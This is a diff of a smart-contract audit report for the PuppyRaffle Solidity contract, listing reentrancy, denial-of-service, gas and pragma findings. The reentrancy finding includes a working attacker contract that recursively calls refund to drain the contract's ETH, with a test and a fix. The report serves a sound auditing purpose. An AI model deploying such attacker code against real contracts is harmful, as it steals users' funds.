@@ -1,3 +1,116 @@
+
+### [H-#] There is a possible Reentrancy attack happening in `PuppyRaffle::refund`.
+
+**Description:** In the function `PuppyRaffle::refund`, you are sending the refund to the user and after sending updating the state of the mapping which is the reason why  reentract attack can happen very easily. Remember the rule to first update the state and then execute the code or just follow CEI rule i.e. checks, effects, implementation.
+
+```javascript
+
+function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+@>        payable(msg.sender).sendValue(entranceFee);
+@>        players[playerIndex] = address(0);
+        emit RaffleRefunded(playerAddress);
+    }
+
+```
+
+**Impact:** This seems to be a very tiny bug from naked eye, but in reality an attacker can very easily wipe out all the Eth from the contract with so ease and with in seconds. In you contract when user calls the function `PuppyRaffle::refund`, first it verifies the written checks and it they gets approved the the refund is sent to the user, so when `payable(msg.sender).sendValue(entranceFee);` this line gets triggered and suppose the cantract is calling this function so this line just looks for receive or fallback function in contract and suppose if the receive or fallback says to just run the `PuppyRaffle::refund` then it just gets stuck in a loop that ends when the amount of the contract gets empty because we updated the state after sending eth.
+
+**Proof of Concept:** The above test proves that there is a possibility of an Reentrancy attack.
+Add the below code in your `PuppyRaffleTest.t.sol` file: 
+
+<details>
+<summary>Code</summary>
+
+```javascript
+
+function testReentrancyAttackCanHappen() external{
+
+    address[] memory players = new address[](3);
+    players[0] = address(111);
+    players[1] = address(100);
+    players[2] = address(200);
+    puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
+
+    uint256 startingContractBalance = address(puppyRaffle).balance;
+    ReentrancyAttacker ree = new ReentrancyAttacker(puppyRaffle);
+    uint256 startingAttackerContractBalance = address(ree).balance;
+    ree.attack{value: entranceFee}();
+
+    uint256 endingContractBalance = address(puppyRaffle).balance;
+    uint256 endingAttackerContractBalance = address(ree).balance;
+
+    console.log("the starting balance of attacker contract is: ", startingAttackerContractBalance);
+    console.log("the starting balance of contract is: ", startingContractBalance);
+    console.log("the endinging balance of attacker contract is: ", endingAttackerContractBalance);
+    console.log("the endinging balance of contract is: ", endingContractBalance);
+    }
+
+
+contract ReentrancyAttacker {
+
+    PuppyRaffle puppy;
+    uint256 fees;
+    uint256 playerIndex;
+
+    constructor(PuppyRaffle _puppy){
+        puppy = _puppy;
+
+    }
+
+    function attack() external payable{
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        fees = puppy.entranceFee();
+        puppy.enterRaffle{value: fees}(players);
+        playerIndex = puppy.getActivePlayerIndex(address(this));
+        puppy.refund(playerIndex);
+    }
+
+    fallback() external payable{
+        if(address(puppy).balance >= fees){
+            puppy.refund(playerIndex);
+        }
+    }
+
+    receive() external payable{
+        if(address(puppy).balance >= fees){
+            puppy.refund(playerIndex);
+        }
+    }
+}
+
+```
+
+</details>
+
+
+**Recommended Mitigation:** My recommendation to secure your contract from Reentrancy attack is always follow CEI (checks,effects,interactions) in your function which is sending eth. 
+The change you should do in your function `PuppyRaffle::refund` is just use this line `players[playerIndex] = address(0);` before this `payable(msg.sender).sendValue(entranceFee);`. This way you can prevent your contract from Reentrancy attack.
+
+
+
+```diff
+
+function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+        // @audit Reentrancy attack here
++       players[playerIndex] = address(0);
+        payable(msg.sender).sendValue(entranceFee);
+
+-       players[playerIndex] = address(0);
+        emit RaffleRefunded(playerAddress);
+    }
+
+```
+
+
+
 ### [M-#] There can be a denial of servies (DoS) attack in the function `PuppyRaffle::enterRaffle`.
 
 **Description:** The function `PuppyRaffle::enterRaffle` loops through the `players` to check for duplicates. Which is a issue as longer the `PuppyRaffle::players` array becomes the more it has to loop through the array and check for duplicates. This means that the gas cost for the  players who entered right after the raffle starts will be less as complared to the players entering after and after. So more the players gets added to the `PuppyRaffle::players` array the more gas will be used.
@@ -77,92 +190,62 @@ function enterRaffle(address[] memory newPlayers) public payable {
 
 
 
-### [M-#] There is a possible Reentrancy attack happening in `PuppyRaffle::refund`.
 
-**Description:** In the function `PuppyRaffle::refund`, you are sending the refund to the user and after sending updating the state of the mapping which is the reason why  reentract attack can happen very easily. Remember the rule to first update the state and then execute the code or just follow CEI rule i.e. checks, effects, implementation.
+# Gas
 
-**Impact:** This seems to be a very tiny bug from naked eye, but in reality an attacker can very easily wipe out all the Eth from the contract with so ease and with in seconds. In you contract when user calls the function `PuppyRaffle::refund`, first it verifies the written checks and it they gets approved the the refund is sent to the user, so when `payable(msg.sender).sendValue(entranceFee);` this line gets triggered and suppose the cantract is calling this function so this line just looks for receive or fallback function in contract and suppose if the receive or fallback says to just run the `PuppyRaffle::refund` then it just gets stuck in a loop that ends when the amount of the contract gets empty because we updated the state after sending eth.
+### [G-1] Some of the state variables should be marked as constant or immutable
 
-**Proof of Concept:** The above test proves that there is a possibility of an Reentrancy attack: 
+Reading from the storage can be more gas expensive as compared to readin from constants or immutables.
 
-```javascript
-
-function testReentrancyAttackCanHappen() external{
-
-    address[] memory players = new address[](3);
-    players[0] = address(111);
-    players[1] = address(100);
-    players[2] = address(200);
-    puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
-
-    uint256 startingContractBalance = address(puppyRaffle).balance;
-    ReentrancyAttacker ree = new ReentrancyAttacker(puppyRaffle);
-    uint256 startingAttackerContractBalance = address(ree).balance;
-    ree.attack{value: entranceFee}();
-
-    uint256 endingContractBalance = address(puppyRaffle).balance;
-    uint256 endingAttackerContractBalance = address(ree).balance;
-
-    console.log("the starting balance of attacker contract is: ", startingAttackerContractBalance);
-    console.log("the starting balance of contract is: ", startingContractBalance);
-    console.log("the endinging balance of attacker contract is: ", endingAttackerContractBalance);
-    console.log("the endinging balance of contract is: ", endingContractBalance);
-    }
+Instances: 
+- `PuppyRaffle::raffleDuration` should be marked as `immutable`.
+- `PuppyRaffle::commonImageUri` should be marked as `constant`.
+- `PuppyRaffle::rareImageUri` should be marked as `constant`.
+- `PuppyRaffle::legendaryImageUri` should be marked as `constant`.
 
 
-contract ReentrancyAttacker {
+### [G-2] Function `PuppyRaffle::enterRaffle` can be marked as external instead of public
 
-    PuppyRaffle puppy;
-    uint256 fees;
-    uint256 playerIndex;
-
-    constructor(PuppyRaffle _puppy){
-        puppy = _puppy;
-
-    }
-
-    function attack() external payable{
-        address[] memory players = new address[](1);
-        players[0] = address(this);
-        fees = puppy.entranceFee();
-        puppy.enterRaffle{value: fees}(players);
-        playerIndex = puppy.getActivePlayerIndex(address(this));
-        puppy.refund(playerIndex);
-    }
-
-    fallback() external payable{
-        if(address(puppy).balance >= fees){
-            puppy.refund(playerIndex);
-        }
-    }
-
-    receive() external payable{
-        if(address(puppy).balance >= fees){
-            puppy.refund(playerIndex);
-        }
-    }
-}
-
-```
+Consider using `external` instead of public in the function `PuppyRaffle::enterRaffle` as enterRaffle function in being used in the contract anywhere so marking it as external can be a good practise to save gas.
 
 
-**Recommended Mitigation:** My recommendation to secure your contract from Reentrancy attack is always follow CEI (checks,effects,interactions) in your function which is sending eth. 
-The change you should do in your function `PuppyRaffle::refund` is just use this line `players[playerIndex] = address(0);` before this `payable(msg.sender).sendValue(entranceFee);`. This way you can prevent your contract from Reentrancy attack.
+### [G-3] Storage variable in a loop should be cached
+
+Everytime `players.length` gets called it gets read from storage, while using a variable reads from memory which is more gas efficient as of storage.
 
 ```diff
-
-function refund(uint256 playerIndex) public {
-        address playerAddress = players[playerIndex];
-        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
-        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
-
-        // @audit Reentrancy attack here
-+       players[playerIndex] = address(0);
-        payable(msg.sender).sendValue(entranceFee);
-
--       players[playerIndex] = address(0);
-        emit RaffleRefunded(playerAddress);
-    }
-
++        uint256 playersLength = players.length
+-        for (uint256 i = 0; i < players.length - 1; i++) {
++         for (uint256 i = 0; i < playersLength - 1; i++) {
+-            for (uint256 j = i + 1; j < players.length; j++) {
++            for (uint256 j = i + 1; j < playersLength; j++) {
+                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
+            }
+        }
+  
 
 ```
+
+
+
+### [I-1] Solidity pragma version should be specific, not wide
+
+Consider using a specific version of solidity in your contracts instead of using wide version.
+Eg: instead of using `pragma solidity ^0.7.6;` you should use `pragma solidity 0.7.6;`.
+
+
+
+### [I-2] Solidity pragma version used should be a bit latest
+
+Consider using a bit latest version of solidity as you have marked `pragma solidity ^0.7.6;` which is way too older, I recommend you to use more latest version of pragma solidity.
+
+
+
+### [I-3] Missing checks for `address(0)` when assigning values to address state variables
+
+Consider suing checks before assigning values to address because what if the address is `address(0)`.
+
+
+
+### [I-4] 
+
